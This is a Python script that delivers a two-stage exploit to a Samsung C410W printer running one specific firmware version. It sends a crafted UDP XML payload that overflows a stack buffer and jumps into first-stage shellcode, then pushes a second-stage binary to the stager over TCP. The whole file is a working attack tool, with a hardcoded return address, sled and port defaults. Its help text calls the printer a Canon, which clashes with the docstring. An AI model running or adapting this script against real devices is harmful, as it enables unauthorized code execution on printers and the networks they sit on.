#!/usr/bin/env python3
"""
Exploit delivery script for Samsung C410W — firmware V3.00.02.20 (DEC-15-2015).

Two-stage deployment chain:
  1. UDP exploit — sends a crafted <LAN_TEST_PROC><WIRELESS_TEST> payload
     that overflows the stack, redirects execution through a NOP sled, and
     runs the first-stage stager (program_loader.bin).
  2. TCP delivery — after a short sleep, connects to the stager's listener
     on port 25564 and sends the second-stage payload (application.bin) as
     a 4-byte big-endian size prefix followed by the raw binary.
"""

import argparse
import socket
import struct
import sys
import time
from pathlib import Path

# Default return-address in the printer's receive buffer.
# This is where the NOP sled + shellcode lands in RAM on the target.
DEFAULT_RECV_BUF = 0x40A2570C

# Must be large enough to slide past any minor stack-alignment variance.
DEFAULT_SLED_LEN = 0x5B

# UDP port the printer's LAN_TEST_PROC handler listens on.
DEFAULT_UDP_PORT = 7000

# TCP port the first-stage stager (program_loader) binds to.
DEFAULT_LOADER_PORT = 25564

# Seconds to wait between stage 1 (UDP exploit) and stage 2 (TCP delivery).
# The printer needs time to parse the exploit, crash into the stager, and
# bring up its TCP listener.
DEFAULT_SLEEP = 2.0

# Canonical paths to the build artifacts, resolved relative to this script.
SCRIPT_DIR = Path(__file__).resolve().parent
DEFAULT_STAGE1 = SCRIPT_DIR / "build" / "program_loader.bin"
DEFAULT_STAGE2 = SCRIPT_DIR / "build" / "application.bin"


def read_binary(path: Path) -> bytes:
    """Read *path* as raw bytes.  Exit with an error if the file is missing
    or cannot be read."""

    if not path.is_file():
        print(f"Error: file not found — {path}", file=sys.stderr)
        sys.exit(1)
    try:
        return path.read_bytes()
    except OSError as exc:
        print(f"Error: cannot read {path} — {exc}", file=sys.stderr)
        sys.exit(1)


def build_payload(recv_buf: int, shellcode: bytes,
                  sled_len: int = DEFAULT_SLED_LEN) -> bytes:
    """Assemble the UDP exploit packet.

    The packet exploits a stack buffer overflow in the printer's
    <WIRELESS_TEST> XML handler.  Register values must not contain 0x0A
    (newline — terminates XML) or 0x00 (null — terminates C string).

    """

    payload = bytearray()
    payload += b"<LAN_TEST_PROC><WIRELESS_TEST\n>\n<RETRY>\n"

    # Saved registers R1–R8 (all set to 0xFFFFFFFF — disallowed: 0x0A, 0x00)
    # PUSH {r1, r2, r3, r4, r5, r6, r7, r8, lr}
    for _ in range(8):
        payload += 0xFFFFFFFF.to_bytes(4, "big")

    # Compute the return address so that PC lands inside the NOP sled.
    # +5 accounts for "PC + \\n + two bytes of sled already covered".
    offset = len(payload) + 5 + sled_len
    return_addr = offset + recv_buf
    payload += return_addr.to_bytes(4, "big")

    # Newline terminates the overflow line inside the XML parser.
    payload += b"\n"

    # Make space for the payload
    payload += bytes([0xAA]) * sled_len

    # First-stage shellcode (program_loader.bin).
    payload += shellcode

    return bytes(payload)


def send_udp_payload(target_ip: str, target_port: int, payload: bytes) -> None:
    """Open a UDP socket and fire *payload* at *target_ip*:*target_port*."""

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(payload, (target_ip, target_port))
        sock.close()
    except OSError as exc:
        print(f"Error: UDP send failed — {exc}", file=sys.stderr)
        sys.exit(1)


def deploy_second_stage(target_ip: str, port: int, binary: bytes,
                        sleep_s: float = DEFAULT_SLEEP) -> None:
    """Deliver the second-stage binary to the printer's stager. """

    time.sleep(sleep_s)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        sock.sendall(struct.pack(">I", len(binary)))
        sock.sendall(binary)
        sock.close()
    except OSError as exc:
        print(f"Error: TCP delivery failed — {exc}", file=sys.stderr)
        sys.exit(1)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Deliver a two-stage exploit to a Canon C410W printer.",
    )
    parser.add_argument(
        "target_ip",
        help="IP address of the target printer",
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=DEFAULT_UDP_PORT,
        help=f"UDP port for the exploit payload (default: {DEFAULT_UDP_PORT})",
    )
    parser.add_argument(
        "--stage1",
        type=Path,
        default=DEFAULT_STAGE1,
        help="path to the first-stage shellcode (program_loader.bin)",
    )
    parser.add_argument(
        "--stage2",
        type=Path,
        default=DEFAULT_STAGE2,
        help="path to the second-stage binary (application.bin)",
    )
    parser.add_argument(
        "--loader-port",
        type=int,
        default=DEFAULT_LOADER_PORT,
        help=f"TCP port the stager listens on (default: {DEFAULT_LOADER_PORT})",
    )
    parser.add_argument(
        "--sleep",
        type=float,
        default=DEFAULT_SLEEP,
        help=f"seconds to wait between stages (default: {DEFAULT_SLEEP})",
    )
    parser.add_argument(
        "-r", "--recv-buf",
        type=lambda x: int(x, 0),
        default=hex(DEFAULT_RECV_BUF),
        help="hex return address / recv buffer location",
    )
    parser.add_argument(
        "--sled",
        type=lambda x: int(x, 0),
        default=DEFAULT_SLED_LEN,
        help=f"NOP sled length in bytes (default: {DEFAULT_SLED_LEN:#x})",
    )
    args = parser.parse_args()
    stage1_path = args.stage1.resolve()
    stage2_path = args.stage2.resolve()

    stage1_bin = read_binary(stage1_path)
    stage2_bin = read_binary(stage2_path)

    print(f"[*] stage1  {stage1_path}  ({len(stage1_bin):,} bytes)")
    print(f"[*] stage2  {stage2_path}  ({len(stage2_bin):,} bytes)")
    print(f"[*] stage2 size header = {struct.pack('>I', len(stage2_bin)).hex()}")

    payload = build_payload(args.recv_buf, stage1_bin, args.sled)

    return_addr = args.recv_buf + len(payload) - len(stage1_bin) - args.sled + 5
    print(f"[*] recv_buf      = {args.recv_buf:#010x}")
    print(f"[*] return_addr   = {return_addr:#010x}")
    print(f"[*] payload size  = {len(payload):,} bytes")
    print(f"[*] sled length   = {args.sled:#x}")

    print(f"[*] stage 1 — sending UDP exploit to {args.target_ip}:{args.port} …")
    send_udp_payload(args.target_ip, args.port, payload)

    print(f"[*] stage 2 — sleeping {args.sleep}s …")
    deploy_second_stage(args.target_ip, args.loader_port,
                        stage2_bin, args.sleep)

    print("[*] done.")


if __name__ == "__main__":
    main()
